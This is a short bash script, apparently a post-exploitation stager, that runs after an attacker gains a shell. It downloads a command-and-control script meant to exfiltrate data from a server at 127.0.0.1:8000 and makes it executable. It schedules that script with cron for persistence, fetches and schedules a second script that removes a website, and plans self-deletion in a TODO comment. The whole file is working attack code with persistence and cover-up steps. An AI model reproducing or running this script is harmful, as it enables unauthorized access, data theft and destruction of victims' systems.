#!/bin/bash

#This is what is run once we gain terminal access:

#Part 1: load commands + post data on website
#download our code to exfil data
code_name="C2.sh"
wget -O $code_name http://127.0.0.1:8000/C2_code
chmod +x $code_name

#TODO: set cron
path=$(pwd)
(crontab -l ; echo "30 01 * * * $path/$code_name" )| crontab -

#Part 2:remove website after 1 hour
code_name="remove_website.sh"
wget -O $code_name http://127.0.0.1:8000/remove_website
chmod +x $code_name

#TODO: set cron
(crontab -l ; echo "17 09 * * * $path/$code_name" )| crontab -

#TODO: rm self once done